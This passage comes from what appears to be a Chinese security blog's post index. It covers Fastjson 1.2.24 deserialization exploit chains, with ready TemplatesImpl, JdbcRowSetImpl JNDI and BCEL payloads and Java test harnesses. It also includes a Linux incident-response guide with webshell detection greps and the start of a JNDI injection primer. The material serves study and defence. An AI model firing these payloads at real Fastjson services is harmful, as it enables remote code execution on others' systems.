[https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Bypass/Fastjson1.2.25-1.2.47%E7%BB%95%E8%BF%87%E6%97%A0%E9%9C%80AutoType/Fastjson1.2.25-1.2.47%E7%BB%95%E8%BF%87%E6%97%A0%E9%9C%80AutoType.md](https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Bypass/Fastjson1.2.25-1.2.47%E7%BB%95%E8%BF%87%E6%97%A0%E9%9C%80AutoType/Fastjson1.2.25-1.2.47%E7%BB%95%E8%BF%87%E6%97%A0%E9%9C%80AutoType.md)\n- [Java安全学习——Fastjson反序列化漏洞 - 枫のBlog](https://goodapple.top/archives/832)\n","tags":["web安全","fastjson"],"categories":["java安全"]},{"title":"fastjson1.2.24反序列化漏洞","url":"/2024/04/26/fastjson1-2-24反序列化漏洞/","content":"\n\n\n\n# fastjson1.2.24反序列化漏洞\n\n\n## 影响版本\nFastjson 1.2.x系列的1.2.22-1.2.24版本。\n\n\n## TemplateImpl的利用链\n### 条件\n\n1. 服务端使用parseObject()时，必须使用如下格式才能触发漏洞： JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);\n2. 服务端使用parse()时，需要 JSON.parse(text1,Feature.SupportNonPublicField)\n\n\n\n流程\n<img src=\"/img/4-26/1.png\" >\n### poc\n```java\n  String evilCode = Base64.encodeBase64String(Calc.getCodeByte());\n                        final String NASTY_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\";\n                        String text = \"{\\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\\\"_bytecodes\\\":[\\\"\" + evilCode + \"\\\"],'name':'yyjccc','_tfactory':{ },\\\"_outputProperties\\\":{ },\";\n                        System.out.println(text);\n```\n```json\n{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n\"_bytecodes\":[\"yv66vgAAADQAGQEABll5amNjYwcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAoACwoACQAMAQAEY2FsYwgADgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABAAEQoACQASAQAGPGluaXQ+DAAUAAYKAAQAFQEAClNvdXJjZUZpbGUBAAtZeWpjY2MuamF2YQAhAAIABAAAAAAAAgAIAAUABgABAAcAAAAWAAIAAAAAAAq4AA0SD7YAE1exAAAAAAABABQABgABAAcAAAARAAEAAQAAAAUqtwAWsQAAAAAAAQAXAAAAAgAY\"],\n\"_name\":\"yyjccc\",\n\"_tfactory\":{ },\n\"_outputProperties\":{ }\n}\n```\n测试代码：\n```java\npackage com.yyjccc.FastjsonExp;\n\nimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.parser.Feature;\nimport com.alibaba.fastjson.parser.ParserConfig;\nimport com.yyjccc.javassist.Calc;\nimport org.apache.commons.codec.binary.Base64;\nimport org.apache.commons.io.IOUtils;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\n// TemplatesImpl 链子的 EXP\npublic class TemplatesImplPoc {\n\n    public static void main(String args[]) {\n        try {\n            ParserConfig config = new ParserConfig();\n            String evilCode = Base64.encodeBase64String(Calc.getCodeByte());\n            final String NASTY_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\";\n            String text = \"{\\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\\n\\\"_bytecodes\\\":[\\\"\" + evilCode + \"\\\"],\\n\\\"_name\\\":\\\"yyjccc\\\",\\n\\\"_tfactory\\\":{ },\\n\\\"_outputProperties\\\":{ }\\n}\";\n            System.out.println(text);\n\n            Object obj = JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n设置允许设置私有属性\n设置Feature.SupportNonPublicField\n```java\nParserConfig config = new ParserConfig();\n Object obj = JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);\n```\n### 调试\n因为设置支持私有属性，所以能够直接反射赋值\n\n1. _bytecodes数据的base64解码\n\n在读取_bytecodes属性的时候，应为_bytecodes属性为Class数组\n会走进ObjectArrayCodec类中deserialze方法中\n<img src=\"/img/4-26/2.png\" >\n继续跟进\n<img src=\"/img/4-26/3.png\" >\n在JSONScaner中的bytesValue对数据进行base64解码\n<img src=\"/img/4-26/4.png\" >\n\n2.\n. this.sortedFieldDeserializers和this.extraFieldDeserializers两组List区别\nFieldDeserializers 是存放了各个属性的反序列化器，其中主要属性和方法：\n\n- fieldInfo存放属性名，属性getter/setter，Field对象等信息；\n- clazz 存放属性所属类的Class对象\n- parseField() 根据fieldType获取对应的fieldValueDeserilizer完成对属性值的反序列化 和 赋值操作\n1. **this.sortedFieldDeserializers**sortedFieldDeserializers存放的属性主要来源于beanInfo，**在beanInfo的build方法中会将setter/getter符合条件的FieldInfo增加到beanInfo.sortedFields中。**其中的FieldInfo都包含了Method对象，最终都通过Method.invoke()进行赋值；\n2. **this.extraFieldDeserializers**\n\nextraFieldDeserializers 会将getDeclaredFields 符合修饰符条件的Field增加进去。\nFieldInfo Method对象为空，最终都通过Field.set()进行赋值；\n\n除去_outputProperties前面的_\n在JavaBeanDeserializer#smartMatch中处理\n<img src=\"/img/4-26/5.png\" >\n当没有获取到deserializer的时候\n处理属性名除去_\n<img src=\"/img/4-26/6.png\" >\n\n到最后操作_outputProperties的时候触发链子\n触发到达TemplateImpl#getOutputProperties中\n<img src=\"/img/4-26/7.png\" >\n往下就是非常常见的TemplatesImpl字节码加载的触发链\n跟进newTransformer中\n<img src=\"/img/4-26/8.png\" >\n跟进getTransletInstance中\n<img src=\"/img/4-26/9.png\" >\n_name属性不能为null,否则提前退出\n进入defineTransletClasses()\n创建了一个类加载器，然后如下循环加载_bytecodes中的字符数组\n<img src=\"/img/4-26/10.png\" >\n加载后会检查加载的类是否是继承于com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet \n因此加载的恶意类需要设置父类：AbstractTranslet\n\n## JdbcRowSetImpl利用链\n### 条件\n\n- fastjson版本<=1.2.24\n- 机器能出网，能够打jndi\n\n流程\n```java\nBaseRowSet#setDataSourceName\n\nJdbcRowSetImpl#setAutoCommit->\nJdbcRowSetImpl#connect->\nJdbcRowSetImpl#getDataSourceName\nlookup()\n```\n### Poc\n```json\n{\n\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n\"DataSourceName\":\"rmi://127.0.0.1:8085/YjQUxZVf\",\n\"AutoCommit\":false\n}\n```\n测试代码\n```java\npublic class JdbcRowSetImplPoc {\n    public static void main(String[] args) {\n        String jndiAddress=\"rmi://127.0.0.1:8085/YjQUxZVf\";\n        String data=\"{\\n\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\n\\\"DataSourceName\\\":\\\"\"+jndiAddress+\"\\\",\\n\\\"AutoCommit\\\":false\\n}\";\n        System.out.println(data);\n        JSON.parseObject(data);\n        //JSON.parse(data);\n    }\n}\n```\n### 调式\n在设置AutoCommit属性的时候触发链子\nJdbcRowSetImpl#setAutoCommit方法中\n<img src=\"/img/4-26/11.png\" >\n跟进connect方法\n<img src=\"/img/4-26/12.png\" >\n这里直接初始化了JNDI上下文环境，使用lookup查询DataSourceName\n因此可以设置DataSourceName的值打jndi\n\n\n## Bcel字节码加载攻击链\n### 条件\n\n- 需要有如下commons-dbcp依赖或者tomc-dbcp依赖\n- fastjson<=1.2.36\n- jdk<8u251\n\n特殊点: com.sun.org.apache.bcel是位于原生的JDK中的:\nBCEL Classloader在 JDK < 8u251之前是在rt.jar里面。\n\n1. 自定义使用加载类的Classloader为com.sun.org.apache.bcel.internal.util.ClassLoader\n2. 自定义指定Classloader加载的类名\n### Poc\n\n1. commons-dbcp\n```xml\n<dependency>\n    <groupId>commons-dbcp</groupId>\n    <artifactId>commons-dbcp</artifactId>\n    <version>1.4</version>\n</dependency>\n```\npo\n\n\n流程\n```java\nBasicDataSource#setDriverClassName()\nBasicDataSource#setDriverClassLoader()\n\nBasicDataSource#getConnection()->\nBasicDataSource#createDataSource()->\nBasicDataSource#createConnectionFactory()->\nClass.forName()\n```\n\n2. tomcat-dbcp\n```xml\n<dependency>\n  <groupId>org.apache.tomcat</groupId>\n  <artifactId>tomcat-dbcp</artifactId>\n  <version>9.0.65</version>\n</dependency>\n```\npoc\n```json\n{\n\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n\"driverClassName\":\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$Ae$8f$cdJ$c3P$Q$85$cf$f4$t$89$b7Q$9bj$ab$$$5d$99$ba$b0$hw$zn$EW$82bAq$Z$c7K$b8$n$s$90$de$W$7d$y7$w$$$7c$A$lJ$9c$h$x$W$9c$cd$cca$ce$7c$9c$f9$fcz$ff$Ap$8c$3d$82w$fb$941$b3$P$ot$b3d$91$8c$f2$a4HG$Xw$99f$eb$a3I$I$s$9c$9b$c2$d8$TB3$k$5e$TZ$a7$e5$bd$sD$7f$ee$abya$cd$83$f6$R$QT$aa$edR$T$fa$f1$f0$fc$9fm$iB$a1$a3$b0$86P$60$9c$e4$i$60C$s$fd$a8$99p$Q$af$5cLme$8at$bc$K$b9$acJ$d6$b3$99$40$ba$88$i$a4$tOL$ea$80$n$b6$e1$v$b4$d0$97$Y$d3r$5e$b1$3e3$b9$c4$e8$fc$3cy$e4$u$d8GC$y$ae$g$I$d0$86$H$82$_j$m$da$95z$c3zo$f3$F$5b7$cf$b5$sG$5dz$o$e9$q$bd$7d$f8$8a$c1$efz$a7F$ed$7e$D$3c$n8iV$B$A$A\",\n\"driverClassLoader\":{\n\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n}\n}\n```\n\n- **tomcat7**:\n\norg.apache.tomcat.dbcp.dbcp.BasicDataSource\n\n- **tomcat8**及其以后:\n\norg.apache.tomcat.dbcp.dbcp2.BasicDataSource\n流程\n```java\n\nBasicDataSource#setDriverClassName()\nBasicDataSource#setDriverClassLoader()\n\nBasicDataSource#getConnection()->\nBasicDataSource#createDataSource()->\nBasicDataSource#createConnectionFactory()->\nDriverFactory#createDrive()->\nClass.forName()\n```\n\nc\n```json\n{\n  \"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\n  \"driverClassName\":\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$Ae$8f$cdJ$c3P$Q$85$cf$f4$t$89$b7Q$9bj$ab$$$5d$99$ba$b0$hw$zn$EW$82bAq$Z$c7K$b8$n$s$90$de$W$7d$y7$w$$$7c$A$lJ$9c$h$x$W$9c$cd$cca$ce$7c$9c$f9$fcz$ff$Ap$8c$3d$82w$fb$941$b3$P$ot$b3d$91$8c$f2$a4HG$Xw$99f$eb$a3I$I$s$9c$9b$c2$d8$TB3$k$5e$TZ$a7$e5$bd$sD$7f$ee$abya$cd$83$f6$R$QT$aa$edR$T$fa$f1$f0$fc$9fm$iB$a1$a3$b0$86P$60$9c$e4$i$60C$s$fd$a8$99p$Q$af$5cLme$8at$bc$K$b9$acJ$d6$b3$99$40$ba$88$i$a4$tOL$ea$80$n$b6$e1$v$b4$d0$97$Y$d3r$5e$b1$3e3$b9$c4$e8$fc$3cy$e4$u$d8GC$y$ae$g$I$d0$86$H$82$_j$m$da$95z$c3zo$f3$F$5b7$cf$b5$sG$5dz$o$e9$q$bd$7d$f8$8a$c1$efz$a7F$ed$7e$D$3c$n8iV$B$A$A\",\n  \"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n  }\n}\n```\n上面payload只是parseObject方法能够触发\nparse下能够触发\n```json\n{\n  {\n  \"x\":{\n    \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n    \"driverClassLoader\": {\n      \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n    },\n    \"driverClassName\": \"$$BCEL$$$l$8b$I$A$...\"\n  }\n}: \"x\"\n}\n```\n\n- 首先是将原payload包上{}，放在value的位置，这样反序列化后，就会获得一个JSONObject对象\n- 之后再将其包上{}，放在key的位置，在Parse中，Key为Json，则会调用其toString方法，而toString会触发getter（ASM实现），从而实现触发。\n\n也就是先再外部套一层构造出JSONObject\n再使其为key，放入json中\n<img src=\"/img/4-26/13.png\" >\n这里反序列化JSONObject的时候，会调用JSONObject.toString方法，然后调用getter方法\n\n\n测试代码\n```java\npackage com.yyjccc.fastjson.exp.low;\n\nimport com.alibaba.fastjson.JSON;\nimport com.sun.org.apache.bcel.internal.classfile.Utility;\nimport com.yyjccc.javassist.Calc;\nimport java.io.IOException;\n/**\n * 版本： Fastjson <=1.2.36版本 <br/>\n * 条件：  commons-dbcp依赖,或者是tomcat-dbcp依赖。只能parseObject触发<br/>\n * jdk:  低于jdk8u251 <br/>\n * 描述： 利用fastjson打BCEL字节码加载\n */\n\npublic class BcelCodeLoadGadget {\n\n    public static String bcelEncode(byte[] bytecode)  {\n\n        try {\n            return \"$$BCEL$$\" + Utility.encode(bytecode, true);\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n\n    }\n\n    public static void main(String[] args) {\n\n\n\n        String BCELCode=bcelEncode(Calc.getCodeByte());\n        String data=TomcatGadgetHigh(BCELCode);\n        JSON.parseObject(data);\n        //JSON.parse(data);\n    }\n\n\n    public static String commonGadget(String BCELCode){\n        String data=\"{\\\"@type\\\":\\\"org.apache.commons.dbcp.BasicDataSource\\\",\\n\\\"driverClassName\\\":\\\"\"+BCELCode+\"\\\",\\n\\\"driverClassLoader\\\":{\\n\\\"@type\\\":\\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"\\n}\\n}\";\n        System.out.println(data);\n        return data;\n    }\n\n    public static String TomcatGadgetHigh(String BCELCode){\n        String data=\"{\\n\\\"@type\\\":\\\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\\\",\\n\\\"driverClassName\\\":\\\"\"+BCELCode+\"\\\",\\n\\\"driverClassLoader\\\":{\\n\\\"@type\\\":\\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"\\n}\\n}\";\n        System.out.println(data);\n        return data;\n    }\n}\n\n```\n\n### 调式\n注：调的是tomcat-dbcp，另外一个代码稍有不一样\n先看看Bcel的ClassLoader\ncom.sun.org.apache.bcel.internal.util.ClassLoader#loadClass()\n<img src=\"/img/4-26/14.png\" >\n会判断是否是$$BCEL$$开头\n<img src=\"/img/4-26/15.png\" >\n跟进createClass方法\n<img src=\"/img/4-26/16.png\" >\n会去除固定前缀，后面使用Utility.decode进行解码\n看一眼Utility#decode\n<img src=\"/img/4-26/17.png\" >\n里面还使用了gzip\n再看看对应的encode\n<img src=\"/img/4-26/18.png\" >\n这里是没有加上前缀的，写一个bcel字节码编码函数\n```java\n\tpublic static String bcelEncode(byte[] bytecode)  {\n\t\ttry {\n\t\t\treturn \"$$BCEL$$\" + Utility.encode(bytecode, true);\n\t\t} catch (IOException e) {\n\t\t\tthrow new RuntimeException(e);\n\t\t}\n\n\t}\n```\n再看看触发函数\nparseObject函数后面会调用JSON.toJSON方法，\n在这里会调用所有的getter方法\nBasicDataSource#getConnection\n<img src=\"/img/4-26/19.png\" >\n跟进createDataSource方法\n<img src=\"/img/4-26/20.png\" >\n继续跟进createConnectionFactory方法\n然后到达DriverFactory#createDriver方法\n<img src=\"/img/4-26/21.png\" >\nforName加载字节码，并进行了初始化\n\n\n\n\n## Reference\n\n- [Fastjson TemplatesImpl 利用链 · BlBana’s BlackHouse](https://drops.blbana.cc/2020/04/01/Fastjson-TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE/)\n- [FastJson反序列化漏洞](https://chenlvtang.top/2022/07/04/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)\n\n\n\n","tags":["java安全","反序列化漏洞","fastjson"],"categories":["java安全"]},{"title":"Linux应急响应","url":"/2024/04/25/Linux应急响应/","content":"\n\n\n\n# Linux应急响应\n\n\n## 概述\n关键目录\n<img src=\"/img/4-25/1.png\" >\n思路：\n账号安全 -> 历史命令 -> 检查异常端口 -> 检查异常进程 -> 检查开机启动项 -> 检查定时任务 -> 检查服务 -> 检查异常文件\n\n\n## 主机排查\n### 常见指令\n#### 端口\n```shell\n# 查找不常用的监听端口 :\nnetstat -anp\niftop\n\n# 运行的进程监听了端口 :\nlsof -i\nlsof -nPi tcp:443\n\n# 使用ss命令查看TCP协议：\nss -anpt\n\n# 使用ss命令查看UDP协议：\nss -anpu\n\n# 使用 tcpdump 分析：\ntcpdump -i {网卡名} host {本地IP} and udp port {本地端口号}\n\n# ARP表 :\narp -a\n\n# 查找监听模式的网卡 :\nip link | grep PROMISC\n\n# 提取所有活跃的连接 tcp ip\n$ netstat -ant |& grep -Po '(\\d{1,3}\\.){3}\\d{1,3}' | sort | grep -v 10.187.0 | uniq -c\n\n```\nnetstat参数\n\n- -t或--tcp 显示TCP传输协议的连线状况\n- -u或--udp 显示UDP传输协议的连线状况\n- -n或--numeric 直接使用IP地址，而不通过域名服务器\n- -p或--programs 显示正在使用Socket的程序识别码和程序名称\n- -l或--listening 显示监控中的服务器的Socket\n- -a或--all 显示所有连线中的Socket\n- -e或--extend 显示网络其他相关信息\n\n组合使用\n```shell\nnetstat -antp\nnetstat -antpu\n```\n#### 进程\n操作系统中，关闭/查看系统进程，删除/新建系统服务。\n典型场景：在应急响应过程中，排查发现可疑系统进程服务，应即时关闭恶意进程或者删除恶意服务，防止被持续控制。\n注意事项：需要联系管理员确认进程服务是否为重要业务，防止错误关闭和删除了重要业务的进程服务。\n\n**ps命令**\n**查看全部的进程**\n```shell\nps -aux\n```\n查看相关进程\n```shell\nps -ef | grep 进程关键字\n```\n显示指定用户相关进程\n```shell\nps -u root //显示root进程用户信息\n```\n查找隐藏进程\n查找显示的进程\n```shell\nps -ef | awk '{print}' | sort -n |uniq >1\n```\n然后查看/proc目录，查看是否存在对应进程\n```shell\nls /proc | sort -n |uniq >2\n```\n参数\n```shell\nnetstat -antlop      #查看  \nps -ef               #查看异常连接和对应的文件  \nps aux               #查看那进程详细信息  \nlsof -p pid          #查看进程关联账户信息  \n  \n附录：ps命令常用用法（方便查看系统进程）  \nps a  \t#显示现行终端机下的所有程序，包括其他用户的程序。  \nps -A \t#显示所有进程。  \nps c \t#列出程序时，显示每个程序真正的指令名称，而不包含路径，参数或常驻服务的标示。  \nps -e \t#此参数的效果和指定\"A\"参数相同。  \nps e \t#列出程序时，显示每个程序所使用的环境变量。  \nps f \t#用ASCII字符显示树状结构，表达程序间的相互关系。  \nps -H \t#显示树状结构，表示程序间的相互关系。  \nps -N \t#显示所有的程序，除了执行ps指令终端机下的程序之外。  \nps s \t#采用程序信号的格式显示程序状况。  \nps S \t#列出程序时，包括已中断的子程序资料。  \nps -t<终端机编号> 　#指定终端机编号，并列出属于该终端机的程序的状况。  \nps u 　 #显示所有程序，不以终端机来区分。以用户为主的格式来显示程序状况。  \nps x 　\t#显示所有程序，不以终端机来区分。\n```\n\n**lsof指令**\n查看什么文件占用的该端口\n```\nlsof -i :[port]\n```\n查看什么文件占用的该pid\n```\nlsof -p [pid]\n```\n\n### 其他\n### lsattr和chattr\n#### chattr\n修改属性能够提高系统的安全 性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录\na：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。\ni：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。i参数对于文件 系统的安全设置有很大帮助。\ns：保密性地删除文件或目录，即硬盘空间被全部收回。\nu：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。\n例子：\n设置/etc/resolv.conf为不可修改\n```shell\n[root@vincent tmp]# chattr +i /etc/resolv.conf \n[root@vincent tmp]# lsattr /etc/resolv.conf \n----i--------e- /etc/resolv.conf\n[root@vincent tmp]# echo \"\" > /etc/resolv.conf \n-bash: /etc/resolv.conf: 权限不够\n```\n#### lsattr\n查看文件权限\n```shell\n[root@vincent tmp]# lsattr 1.txt \n-----a-------e- 1.txt\n```\n### 日志\n在Linux做的操作都会被记录到系统日志中，对于登录也可以查看日志信息查看是否有异常登录\nlast命令记录着所有用户登录系统的日志，可以用来查找非授权用户的登录事件，而last命令的输出结果来源于**/var/log/wtmp**文件，稍有经验的入侵者都会删掉\n<img src=\"/img/4-25/2.png\" >\n常见日志\n```powershell\n内核及公共消息日志:/var/log/messages\n计划任务日志：/var/log/cron\n系统引导日志：/var/log/dmesg\n邮件系统日志:/var/log/maillog\n用户登录日志：/var/log/lastlog\n/var/log/boot.log（记录系统在引导过程中发生的时间）\n/var/log/secure (用户验证相关的安全性事件)\n/var/log/wtmp(当前登录用户详细信息)\n/var/log/btmp（记录失败的的记录）\n/var/run/utmp（用户登录、注销及系统开、关等事件）\n```\n\n1. /var/log/secure \n\nLinux系统安全日志，记录用户和工作组的情况、用户登陆认证情况\n\n2. /var/log/wtmp\n\n记录每个用户的登录次数和持续的时间等信息\n\n3. /var/log/utmp\n\n有关当前用户登陆的信息\n\n\n\n### 账号\n1、用户信息文件 /etc/passwd\n```shell\nroot:x\\:0:0:root:/root:/bin/bash\naccount:password:UID:GID:GECOS:directory:shell\n```\n用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell\n注意：无密码只允许本机登陆，远程不允许登陆\n**2、密码文件 /etc/shadow**\n```powershell\nroot:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7::: \n//用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留\n```\n\n 其他命令\n```powershell\nwho      //查看当前登录用户（tty 本地登陆 pts 远程登录）\nw        //查看系统信息，想知道某一时刻用户的行为\nuptime   //查看登陆多久、多少用户，负载\n```\n\n### 系统启动项\n一般来说，病毒在启动之后为了防止肉鸡关机重启，很有可能会设置恶意的开机启动项\n\n查看运行级别命令runlevel\n```\n\n运行级别\t\t含义\t（七个运行模式）\n0\t\t\t关机\n1\t\t\t单用户模式，可以想象为windows的安全模式，主要用于系统修复\n2\t\t\t不完全的命令行模式，不含NFS服务\n3\t\t\t完全的命令行模式，就是标准字符界面\n4\t\t\t系统保留\n5\t\t\t图形模式/桌面模式（GUI界面）\n6\t\t\t重启动\n \n开机启动配置文件：\n/etc/rc.local\n/etc/rc.d/rc[0~6].d\n```\n\n\n1. **/etc/rc.d/rc.local**\n\n**或者说是/etc/rc.local**\n/etc/rc.local是/etc/rc.d/rc.local的软连接，该脚本是在系统初始化级别脚本运行之后再执行的，想要/etc/rc.local起作用必须[**chmod**](https://so.csdn.net/so/search?q=chmod&spm=1001.2101.3001.7020) +x /etc/rc.d/rc.local\n\n2. **/etc/init.d目录下的脚本**\n\n目录内放的是各个服务的启动脚本，比如sshd、httpd等\n<img src=\"/img/4-25/3.png\" >\n\n3. ** /etc/profile.d/*.sh**\n\n/etc/profile.d/*.sh是bash的全局配置文件，/etc/profile.d/下有许多shell脚本，可以在开机时启动。\n\n### 定时计划\n在操作系统中，分析查看计划任务信息。\n典型场景：在应急响应过程中，发现入侵者创建的异常计划任务，应即时禁用或者删除异常计划任务，防止被持续控制。\n注意事项：需要联系系统管理员确认计划任务是否合法，防止错误禁用和删除了正常的计划任务。\n\n使用命令\ncrontab\n列出所有的计划任务\n```shell\ncrontab -l\n```\n```shell\n# Root用户定时任务 :\ncrontab -u root -l\n```\n编辑cron\n```shell\ncrontab -e\n```\n\n常见计划任务位置\n```shell\n重点关注以下目录(计划目录)中是否存在恶意脚本：\n\t/var/spool/cron/*\n\t/etc/crontab\n\t/etc/cron.d/*\n\t/etc/cron.daily/*\n\t/etc/cron.hourly/*\n\t/etc/cron.monthly/*\n\t/etc/cron.weekly/\n\t/etc/anacrontab\n\t/var/spool/anacron/*\n小技巧：\nmore /etc/cron.daily/* 查看目录下所有文件\n\n```\n```shell\n# 系统定时任务 :\ncat /etc/crontab\ncat /etc/anacrontab\n\n# 查看计划任务文件 :\nls -la /var/spool/cron/\nls -la /var/spool/anacron/\nls -la /var/spool/at/spool/\n\n# 系统定时任务文件 :\n$ find /etc/cron* -type f\n/etc/cron.d/sysstat\n/etc/cron.d/0hourly\n/etc/cron.daily/logrotate\n/etc/cron.daily/man-db.cron\n/etc/cron.deny\n/etc/cron.hourly/0anacron\n```\n\n\n## webshell查杀\n**思路**\n<img src=\"/img/4-25/4.png\" >\n网络排查、日志排查、文件排查\n扫描工具：\n1、D盾\nWebshell查杀、可疑文件隔离；端口进程查看、base64解码，以及克隆用户检测等；文件监控。\n\n2、河马Webshell查杀\n河马Webshell查杀拥有海量Webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术，支持多种操作系统。\n\n手工指令搜索\n```shell\n//搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征\nfind ./ type f -name \"*.jsp\" | xargs grep \"exec(\" \nfind ./ type f -name \"*.php\" | xargs grep \"eval(\" \nfind ./ type f -name \"*.asp\" | xargs grep \"execute(\" \nfind ./ type f -name \"*.aspx\" | xargs grep \"eval(\" \n\n//对于免杀Webshell，可以查看是否使用编码\nfind ./ type f -name \"*.php\" | xargs grep \"base64_decode\" \n\n```\n\n\n\n## \n\n\n## Reference\n\n- [17、Linux应急响应 - gcc_com - 博客园](https://www.cnblogs.com/carmi/p/17804491.html)\n- [Linux应急响应之计划任务篇_应急响应定时任务分析-CSDN博客](https://blog.csdn.net/qq_42671480/article/details/90370715)\n- [Linux应急响应之开机启动项篇_3、排查启动脚本-CSDN博客](https://blog.csdn.net/qq_42671480/article/details/90371042)\n- [网络安全应急响应----9、WebShell应急响应_webshell查杀-CSDN博客](https://blog.csdn.net/sycamorelg/article/details/123516928)\n- [Blue-Team/应急/linux应急响应手册.md at main · Lorna-Dane/Blue-Team](https://github.com/Lorna-Dane/Blue-Team/blob/main/%E5%BA%94%E6%80%A5/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%86%8C.md)\n- \n\n","tags":["Liunx","应急响应","蓝队"],"categories":["蓝队"]},{"title":"JNDI注入","url":"/2024/04/24/JNDI注入/","content":"\n\n\n\n# JNDI注入\n\n\n\nJNDI(Java Naming and Directory Interface)是Java提供的Java命名和目录接口。通过调用JNDI的API可以定位资源和其他程序对象。\nJNDI是Java EE的重要部分，JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA\n## 简介\nJNDI提供统一的客户端API，并由管理者将JNDI API映射为特定的**命名服务**和**目录服务**，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。简单来说，开发人员通过合理的使用JNDI，能够让用户通过统一的方式访问获取网络上的各种资源和服务。如下图所示\n<img src=\"/img/4-24/1.png\" >\n### 命名服务\n(Naming server)\n命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：DNS系统将计算机名和IP地址进行关联、文件系统将文件名和文件句柄进行关联等等。\n在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。\n\t其中另一个值得一提的名称服务为 LDAP，全称为 Lightweight Directory Access Protocol，即轻量级目录访问协议，其名称也是从右到左进行逐级定义，各级以逗号分隔，每级为一个 name/value 对，以等号分隔。比如一个 LDAP 名称如下:\n\n```\ncn=John, o=Sun, c=US\n```\n即表示在 c=US 的子域中查找 o=Sun 的子域，再在结果中查找 cn=John 的对象。关于 LDAP 的详细介绍见后文。\n在名称系统中，有几个重要的概念:\n\n- Bindings: 表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在 DNS 中域名绑定到对应的 IP。\n- Context: 上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (subcontext).\n- References: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C/C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。\n\n### 目录服务\n（Directory Service）\n简单来说，目录服务是命名服务的扩展，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性（Attributes）信息。由此，我们不仅可以根据名称去查找（Lookup）对象(并获取其对应属性)，还可以根据属性值去搜索（Search）对象。\n一些常见的目录服务有：\n\n- LDAP： 轻型目录访问协议\n- Active Directory: 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等；\n- 其他基于 X.500 (目录服务的标准) 实现的目录服务；\n\n### SPI\n可参考：[SnakeYaml](https://www.yuque.com/yyjccc/pk74ko/egeb71vsph4fgg9s)\nSPI 全称为 Service Provider Interface，即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装。在 JDK 中包含了下述内置的目录服务:\n\n- RMI: Java Remote Method Invocation，Java 远程方法调用；\n- LDAP: 